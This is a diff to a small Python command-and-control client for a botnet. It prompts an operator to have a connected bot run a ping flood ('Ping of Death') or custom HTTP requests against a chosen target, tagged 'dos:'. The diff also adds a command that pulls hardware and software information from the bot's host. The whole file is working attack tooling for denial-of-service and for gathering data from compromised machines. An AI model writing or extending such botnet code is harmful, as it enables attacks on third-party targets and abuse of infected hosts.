@@ -1,12 +1,16 @@
 import socket
+import json
+import pprint
 
 def get_action(bot):
-    action = input("[IRC] Perform Ping of Death by bot ('f'), send a custom http request ('c'), kill the bot ('kill') or exit irc connection('exit'). . . ") 
+    action = input("[IRC] Perform Ping of Death by bot ('f'), send a custom http request ('c'), get hardware/software info of bot (i), kill the bot ('kill') or exit irc connection('exit'). . . ") 
     if action == 'f':
         target = input("[IRC] Type the target. . . ")
-        return f"ping -f {target}"
-    elif action == 'e':
-        return input(f"[IRC] Type the request that you want {bot} to perform. . . ")
+        return f"dos:ping -f {target}"
+    elif action == 'c':
+        return "dos:" + input(f"[IRC] Type the request that you want {bot} to perform. . . ")
+    elif action == 'i':
+        return "hwsw:"
     elif action == 'exit' or action == 'kill':
         return action
     return ''
@@ -19,8 +23,6 @@ def irc_client_program():
     # connect to server
     client_socket = socket.socket()
     client_socket.connect((bot, port))
-    
-    
 
     while True:
         msg = get_action(bot)
@@ -31,6 +33,10 @@ def irc_client_program():
         # print('Received from server: ' + data)
         if msg == 'exit' or msg == 'kill':
             break
+        if msg.split(':')[0] == "hwsw":
+            hw_sw_infos = client_socket.recv(4096).decode()
+            hw_sw_infos = json.loads(hw_sw_infos)
+            pprint.pprint(hw_sw_infos)
     
     client_socket.close()
 
